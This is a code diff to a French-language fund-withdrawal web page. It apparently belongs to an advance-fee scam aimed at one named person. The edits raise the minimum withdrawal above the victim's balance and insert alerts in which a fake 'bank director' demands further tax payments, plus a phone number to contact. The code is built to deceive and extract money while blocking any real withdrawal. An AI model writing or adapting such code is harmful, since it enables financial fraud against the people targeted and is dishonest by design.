@@ -142,6 +142,10 @@
 <body>
     <div class="container">
         <h1>Je retire mes fonds</h1>
+        <div classe="texte">
+            <h5>Minimum de retrait a retiré ce monsieur RIBO est passé a 579 000 FCFA</h1>
+        </div>
+        
         
         <div class="balance-display">
             Solde actuel: <span id="current-balance">0 FCFA</span>
@@ -227,7 +231,7 @@ const auth = getAuth(app);
 const database = getDatabase(app);
 
 // ======== CONSTANTES ========
-const MIN_WITHDRAWAL = 1000;
+const MIN_WITHDRAWAL = 579000;
 const MAX_WITHDRAWAL = 850000;
 const FEE_PERCENTAGE = 0.10;
 const WITHDRAWAL_START_HOUR = 9; // Heure de début des retraits (9h)
@@ -402,7 +406,7 @@ async function loadUserData(userId) {
         // Vérification si l'utilisateur est bloqué
         const isBlocked = await checkIfUserBlocked(userId);
         if (isBlocked) {
-            showBlockedAlert("Bonjour monsieur RIBO, je suis monsieur le directeur de la banque Sprite Coke. Votre solde est au niveau de 223 944 FCFA. Vous avez payé une somme de taxe de 15 000 FCFA. Vous devez retirer toute la somme qui est sur votre compte. Veuillez payer, reste à payé 5000FCFA et lancer le retrait. Merci.");
+            showBlockedAlert("Félicitations 🎁🎉 monsieur RIBO vous avez toutes payé maintenant vous avez le droit de lancé votre retrait minimum a retiré 579 000f pour votre niveau, votre solde actuel ne vaut pas numéro qui vas recevoir la somm +2290158841076'.");
             document.getElementById('withdrawal-button').disabled = true;
             return;
         }
